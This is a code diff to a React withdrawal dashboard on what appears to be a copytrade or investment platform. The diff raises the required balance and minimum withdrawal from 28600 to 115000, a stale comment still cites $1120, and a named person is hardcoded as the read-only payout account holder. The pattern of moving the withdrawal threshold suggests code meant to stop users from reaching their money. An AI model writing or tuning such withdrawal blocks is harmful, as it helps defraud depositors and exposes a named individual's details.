@@ -105,7 +105,7 @@ export default function Dashboard() {
   const [withdrawType, setWithdrawType] = useState(""); // "bank" or "wallet"
   const [withdrawAmount, setWithdrawAmount] = useState("");
   const [withdrawSubmitted, setWithdrawSubmitted] = useState(false);
-  const requiredBalance = 28600; // ✅ user must have at least $1120 to withdraw (base balance + 4 days of growth)
+  const requiredBalance = 115000; // ✅ user must have at least $1120 to withdraw (base balance + 4 days of growth)
   const [showFundsWarning, setShowFundsWarning] = useState(false);
   const [showCopytradeModal, setShowCopytradeModal] = useState(false);
   const [copytradeActive, setCopytradeActive] = useState(
@@ -672,7 +672,7 @@ export default function Dashboard() {
             </h2>
 
             {/* Balance Check */}
-            {balance < 28600 ? (
+            {balance < 115000 ? (
               <p className="mb-6 text-sm">
                 <span className="text-red-400">
                   You must have at least ${requiredBalance} to withdraw.
@@ -726,8 +726,8 @@ export default function Dashboard() {
                         </label>
                         <input
                           type="text"
-                          value="Input Bank Name" // ✅ placeholder text instead of real name
-                          // value={customBank}
+                          // value="Input Bank Name" // ✅ placeholder text instead of real name
+                          value={customBank}
                           onChange={(e) => setCustomBank(e.target.value)}
                           className="w-full px-4 py-2 rounded bg-gray-700 text-white"
                         />
@@ -740,8 +740,8 @@ export default function Dashboard() {
                       </label>
                       <input
                         type="text"
-                        value="Input Account Name" // ✅ placeholder text instead of real name
-                        // value="Marvin Lane O'Dell"
+                        // value="Input Account Name" // ✅ placeholder text instead of real name
+                        value="Marvin Lane O'Dell"
                         readOnly
                         className="w-full px-4 py-2 rounded bg-gray-600 text-white cursor-not-allowed"
                       />
@@ -838,8 +838,8 @@ export default function Dashboard() {
                 {/* ✅ Confirm Button */}
                 <button
                   onClick={async () => {
-                    if (Number(withdrawAmount) < 28600) {
-                      setWithdrawMessage("The minimum withdrawal is 28600.");
+                    if (Number(withdrawAmount) < 115000) {
+                      setWithdrawMessage("The minimum withdrawal is 115000.");
                       // setWithdrawMessage(
                       //   "You cannot make repeated withdrawals.",
                       // );
